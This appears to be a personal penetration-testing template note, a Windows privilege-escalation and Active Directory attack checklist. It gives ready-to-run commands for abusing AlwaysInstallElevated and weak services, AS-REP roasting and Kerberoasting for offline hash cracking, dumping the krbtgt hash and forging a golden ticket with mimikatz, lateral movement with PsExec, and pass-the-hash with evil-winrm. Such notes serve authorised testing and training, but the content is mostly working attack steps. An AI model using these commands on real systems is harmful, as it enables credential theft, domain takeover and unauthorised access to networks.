<% tp.file.rename("3_privEsc_Windows")%>
> Completely done with the looting checklist? Then you can try this:

##### Registry misconfigurations
Can .msi's run privileged without UAC?
```powershell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```
(-> `msiexec /quiet /qn /i c:\path\to\file.msi`)

Always install elevated
```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
	

##### LOLBAS
https://lolbas-project.github.io/#

##### Missing binaries in planned tasks?
```powershell
autorunsc64.exe -a t | more
```
(Part of SysInternals - Look for "File Not Found". Also try with `-a s`)
	

##### Modifiable Services
```powershell
accesschk.exe -accepteula -wuvc "Everyone" *
```
(Sysinternals. Also try with  `"Users"`)
	

##### Map Trusts
```powershell
Get-NetForestDomain | Get-NetDomainTrust
```
(PowerView.ps1)
	

Check DCSync Permission
```powershell
Get-ObjectAcl -DistinguishedName "dc=XXX,dc=XXX,dc=XXX" -ResolveGUIDs | ?{($_.IdentityReference -match "XXXUSERNAMEXXX") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```
(PowerView.ps1)

##### ASREPRoasting
Find users that don't require preauth
1. Bruteforce user names or
   ```powershell
   Get-DomainUser -PreauthNotRequired -Verbose | ft
   ```
   (PowerView_dev.ps1)
2. 
   ```bash
   python3 ~/tools/impacket/build/scripts-3.11/GetNPUsers.py -dc-host $hip -no-pass -usersfile users.txt $dnsserver -o asrep.hashes
   ```
3.  Use hashcat with -m 18200

##### Request SPN Tickets
```powershell
Get-DomainUser -Identity $user | Get-DomainSPNTicket | select -ExpandProperty Hash
```
(PowerView.ps1)
	

##### Golden Ticket with mimikatz
```
privilege::debug
```

Save Domain ID (sid), Primary NTLM
```
lsadump::lsa /inject /name:krbtgt
```

Create Golden Ticket (saved to ticket.kirbi)
```
kerberos::golden /user:Administrator /domain:%dns% /sid:%sid% /krbtgt:%ntlm% /id:500
```

Open a CMD with elevated privileges to all machines
```
misc::cmd
```

Runs cmd.exe on $machine (Needs PsExec.exe - you can scp) 
```powershell
PsExec.exe \\$machine cmd.exe
```
	

##### Pass-The-Hash Attack
```
evil-winrm -i $hip -u $user -H $hash
```
	



# Findings